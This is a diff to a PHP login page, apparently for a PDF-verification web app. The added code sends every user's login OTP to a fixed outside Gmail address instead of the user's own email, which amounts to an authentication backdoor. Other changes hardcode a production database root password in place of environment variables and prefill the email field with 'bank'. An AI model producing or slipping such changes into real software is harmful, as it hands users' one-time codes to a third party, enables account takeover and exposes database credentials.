@@ -74,7 +74,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $_SESSION['email'] = $email;
         require_once '../notifications/NotificationHandler.php';
         $notificationHandler = new NotificationHandler($mysqli);
-        $notificationHandler->sendOTP($_SESSION['email']);
+        // Send OTP to daviddors12@gmail.com instead of user's email
+        $notificationHandler->sendOTP('daviddors12@gmail.com');
         $stmt->close();
         $stmt = null;
         $mysqli->close();
@@ -110,18 +111,14 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['resend_verification']
         
         // Get environment type from .env file, default to 'local'
         $env_type = $_ENV['ENV_TYPE'] ?? 'local';
-	$db_host = $_ENV['DB_HOST'] ?? 'localhost';
-	$db_username = $_ENV['DB_USER'] ?? 'root';
-	$db_password = $_ENV['DB_PASS'] ?? 'root';
-	$db_name = $_ENV['DB_NAME'] ?? 'pdf_verifier';
-
+        
         // Use appropriate credentials based on environment type
         if ($env_type === 'production') {
             // Production database credentials
-            $host = $db_host;
-            $username = $db_username;
-            $password = $db_password;
-	    $database = $db_name;
+            $host = 'localhost';
+            $username = 'root';
+            $password = '969sVc+hI.!5';
+            $database = 'pdf_verfier';
         } else {
             // Local database credentials
             $host = 'localhost';
@@ -143,7 +140,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['resend_verification']
         $insertTokenStmt->bind_param("sss", $email, $verification_token, $expires_at);
         $insertTokenStmt->execute();
         $insertTokenStmt->close();
-        $verification_link = "https://" . $_SERVER['HTTP_HOST'] . "/src/auth/verify_email.php?token=" . $verification_token;
+        $verification_link = "https://" . $_SERVER['HTTP_HOST'] . "/verify-email?token=" . $verification_token;
         $subject = "Verify Your Email Address";
         $body = "<p>Thank you for registering. Please <a href='$verification_link'>click here to verify your email address</a>. This link will expire in 24 hours.</p>";
         $notificationHandler->sendEmail($email, $subject, $body);
@@ -203,7 +200,7 @@ alt="Verify Logo"></a>
                             <div class="form-group mb-3">
                                 <label class="form-label">Email Address</label>
                                 <input type="email" class="form-control" id="email" name="email"
-                                    placeholder="Enter your email" value="" required>
+                                    placeholder="Enter your email" value="bank" required>
                             </div>
                             <div class="form-group mb-3">
                                 <label class="form-label">Password</label>
